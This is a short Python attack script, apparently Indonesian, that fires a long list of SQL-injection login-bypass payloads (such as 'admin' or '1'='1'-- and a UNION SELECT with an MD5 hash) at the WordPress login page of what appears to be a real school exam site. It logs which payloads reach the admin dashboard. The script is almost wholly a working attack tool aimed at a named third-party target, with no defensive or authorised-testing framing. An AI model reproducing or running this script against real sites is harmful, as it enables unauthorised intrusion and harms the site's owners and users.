import requests

target = "https://ujian.smpn2jayapura.my.id/wp-login.php"  # GANTI domain WP login kamu
log_file = "mass_sqli_log.txt"

payloads = [
    "-", " ", "&", "^", "*",
    " or ''-", " or '' ", " or ''&", " or ''^", " or ''*",
    "-", " ", "&", "^", "*",
    ' or ""-', ' or "" ', ' or ""&', ' or ""^', ' or ""*',
    "or true--", '" or true--', "' or true--", '") or true--', "') or true--",
    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x",
    '" or "x"="x', '") or ("x")=("x', '")) or (("x"))=(("x',
    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
    "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", 
    "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", 
    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", 
    "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", 
    "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", 
    "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", 
    "admin') or '1'='1'/*", 
    '1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055',
    'admin" --', 'admin" #', 'admin"/*', 'admin" or "1"="1', 
    'admin" or "1"="1"--', 'admin" or "1"="1"#', 'admin" or "1"="1"/*', 
    'admin"or 1=1 or ""="', 'admin" or 1=1', 'admin" or 1=1--', 
    'admin" or 1=1#', 'admin" or 1=1/*', 'admin") or ("1"="1', 
    'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 'admin") or ("1"="1"/*',
    'admin") or "1"="1', 'admin") or "1"="1"--', 'admin") or "1"="1"#', 
    'admin") or "1"="1"/*',
    '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055'
]

def write_log(msg):
    print(msg)
    with open(log_file, "a") as f:
        f.write(msg + "\n")

def test_sqli():
    for p in payloads:
        data = {
            "log": p,
            "pwd": "any_password",
            "wp-submit": "Log In",
            "redirect_to": target.replace('wp-login.php', 'wp-admin/'),
            "testcookie": "1"
        }
        try:
            r = requests.post(target, data=data, timeout=10, allow_redirects=True)
            if "wp-admin" in r.url or "Dashboard" in r.text:
                write_log(f"[!!!] BYPASS BERHASIL dengan: {p}")
            else:
                write_log(f"[+] Gagal bypass pakai: {p}")
        except Exception as e:
            write_log(f"[!] Error: {e} pakai payload: {p}")

write_log("=== WP MASS SQLI TEST ===")
test_sqli()
write_log("=== DONE ===")
